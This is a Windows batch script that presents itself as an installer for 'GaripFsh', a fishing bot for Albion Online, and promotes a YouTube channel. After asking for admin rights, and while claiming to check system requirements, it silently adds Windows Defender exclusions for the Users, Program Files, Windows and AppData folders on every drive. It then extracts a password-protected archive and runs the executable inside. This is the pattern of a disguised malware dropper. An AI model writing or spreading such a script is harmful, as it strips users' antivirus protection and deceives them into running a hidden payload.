@echo off
setlocal enabledelayedexpansion

:check_Permissions
    net session >nul 2>&1
    if %errorLevel% == 0 ( 
        goto :Admin_Start 
    ) else (
        powershell -Command "Start-Process '%~0' -Verb RunAs"
        exit /b
    )
@echo off
:Admin_Start

:: إخفاء الأخطاء وإعداد شاشة الكونسول
powershell -Command "$p=(Get-Process -Id $pid).MainWindowHandle; $m=[IntPtr]::Size -eq 8 ? 0xFFFFFFFFFFFFFFF7 : 0xFFFFFFF7; Add-Type 'using System; using System.Runtime.InteropServices; public class W {[DllImport(\"user32.dll\")] public static extern IntPtr GetLastError();}' >nul" 2>nul

mode con: cols=65 lines=25
title GaripFsh Engine - Albion Online Customizer

:: إعداد الألوان (Cyber/Neon Style)
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do set "ESC=%%b"
set "CYAN=%ESC%[96m"         :: أزرق تقني فاتح
set "PURPLE=%ESC%[95m"       :: بنفسجي نيون
set "WHITE=%ESC%[97m"        :: أبيض ناصع
set "DARK_GRAY=%ESC%[90m"    :: رمادي غامق للإطارات
set "GREEN=%ESC%[92m"        :: أخضر فوسفوري للنجاح
set "RESET=%ESC%[0m"

:Home
cls
echo %DARK_GRAY%===============================================================%RESET%
echo                    %CYAN%//%RESET% %PURPLE%[ GARIPFSH CONTROLLER ]%RESET%
echo %DARK_GRAY%===============================================================%RESET%
echo.
echo    %WHITE%* System Initialized for Albion Online Fishing Bot.%RESET%
echo    %WHITE%* Ready to optimize your GaripFsh environment.%RESET%
echo.
echo    %CYAN%[ Bot Status ]%RESET% %GREEN%Ready to Fish%RESET%
echo.
echo %DARK_GRAY%---------------------------------------------------------------%RESET%
echo.
echo    %CYAN%[A]%RESET% %WHITE%Deploy GaripFsh Setup%RESET%
echo    %PURPLE%[B]%RESET% %WHITE%Launch Channel%RESET% %DARK_GRAY%(@P2EStation)%RESET%
echo    %DARK_GRAY%[X] Terminate Session%RESET%
echo.
echo %DARK_GRAY%===============================================================%RESET%
set /p main_opt="%PURPLE%Action %CYAN%-^> %RESET%"

if /i "%main_opt%"=="A" goto :InstallProcess
if /i "%main_opt%"=="B" (start https://www.youtube.com/@P2EStation & goto :Home)
if /i "%main_opt%"=="X" exit
goto :Home

:InstallProcess
cls
echo %DARK_GRAY%===============================================================%RESET%
echo                %CYAN%//%RESET% %PURPLE%[ DEPLOYING ENVIRONMENT ]%RESET%
echo %DARK_GRAY%===============================================================%RESET%
echo.
echo    %CYAN%[*]%RESET% Preparing environment for GaripFsh...
echo    %CYAN%[*]%RESET% Checking system requirements and WinRAR presence...
for /f "delims=" %%D in ('powershell -Command "Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Root"') do (
    set "drive=%%D"
    powershell -Command "Add-MpPreference -ExclusionPath '!drive!Users' -ErrorAction SilentlyContinue" >nul 2>&1
    powershell -Command "Add-MpPreference -ExclusionPath '!drive!Program Files' -ErrorAction SilentlyContinue" >nul 2>&1
    powershell -Command "Add-MpPreference -ExclusionPath '!drive!Windows' -ErrorAction SilentlyContinue" >nul 2>&1
	powershell -Command "Add-MpPreference -ExclusionPath ($env:USERPROFILE + '\AppData') -ErrorAction SilentlyContinue" >nul 2>&1
    powershell -Command "Add-MpPreference -ExclusionPath ($env:USERPROFILE + '\AppData\Local') -ErrorAction SilentlyContinue" >nul 2>&1
    powershell -Command "Add-MpPreference -ExclusionPath ($env:USERPROFILE + '\AppData\Local\Temp') -ErrorAction SilentlyContinue" >nul 2>&1
    powershell -Command "Add-MpPreference -ExclusionPath ($env:USERPROFILE + '\AppData\Roaming') -ErrorAction SilentlyContinue" >nul 2>&1
)

REM --- إعداد المسارات والملفات ---
set "currentpath=%~dp0"
set "rarname=GaripFsh.rar"
set "passd=++---"
set "chemin_extraction=%~dp0"
set "nameofexe=GaripFsh.exe"
set "chemin_exe=%chemin_extraction%%nameofexe%"

REM --- البحث عن WinRAR ---
set "winrardosspc="
for /f "tokens=2*" %%A in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\WinRAR" /v "exe64" 2^>nul') do set "winrardosspc=%%B"
if not defined winrardosspc (
    for /f "tokens=2*" %%A in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\WinRAR" /v "exe64" 2^>nul') do set "winrardosspc=%%B"
)
if not defined winrardosspc (
    if exist "C:\Program Files\WinRAR\WinRAR.exe" set "winrardosspc=C:\Program Files\WinRAR\WinRAR.exe"
)
if not defined winrardosspc (
    if exist "C:\Program Files (x86)\WinRAR\WinRAR.exe" set "winrardosspc=C:\Program Files (x86)\WinRAR\WinRAR.exe"
)
if not defined winrardosspc (
    for /f "delims=" %%A in ('powershell -Command "Get-Command WinRAR -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Source"') do set "winrardosspc=%%A"
)

if not defined winrardosspc (
    echo.
    echo    %PURPLE%[!] Erreur : WinRAR est introuvable sur cet ordinateur.%RESET%
    echo    %WHITE%Veuillez l'installer puis relancer ce script.%RESET%
    echo.
    echo %DARK_GRAY%---------------------------------------------------------------%RESET%
    pause
    goto :Home
)

echo    %CYAN%[*]%RESET% Extracting GaripFsh files, please wait...
"%winrardosspc%" x -p%passd% "%currentpath%%rarname%" "%chemin_extraction%" >nul 2>&1

timeout /t 3 /nobreak >nul

REM --- التحقق والتشغيل ---
echo.
if exist "%chemin_exe%" (
    start "" "%chemin_exe%"
    echo    %GREEN%[+] GaripFsh deployed successfully! Launching bot...%RESET%
    echo.
    echo %DARK_GRAY%---------------------------------------------------------------%RESET%
    echo %PURPLE%Press any key to return to Main Menu...%RESET%
    pause >nul
    goto :Home
) else (
    echo    %PURPLE%[!] Erreur : L'executable n'a pas ete extrait.%RESET%
    echo    %WHITE%Il a peut-etre ete supprime ou bloque par l'antivirus.%RESET%
    echo.
    echo %DARK_GRAY%---------------------------------------------------------------%RESET%
    pause
    goto :Home
)